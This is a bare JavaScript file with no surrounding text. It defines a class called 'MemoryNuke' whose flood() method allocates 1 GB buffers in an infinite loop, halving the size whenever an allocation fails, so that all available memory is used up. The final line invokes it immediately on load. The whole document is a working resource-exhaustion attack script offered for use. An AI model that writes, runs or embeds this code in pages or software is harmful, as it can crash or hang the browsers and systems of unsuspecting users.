
class MemoryNuke {  
  constructor() {  
    this.buffers = [];  
    this.CHUNK = 1024 * 1024 * 1024; 
  }  

  flood() {  
    while(true) {  
      try {  
        this.buffers.push(new ArrayBuffer(this.CHUNK));  
      } catch(e) {  
        this.CHUNK = this.CHUNK / 2;  
      }  
    }  
  }  
}  


(new MemoryNuke()).flood();  
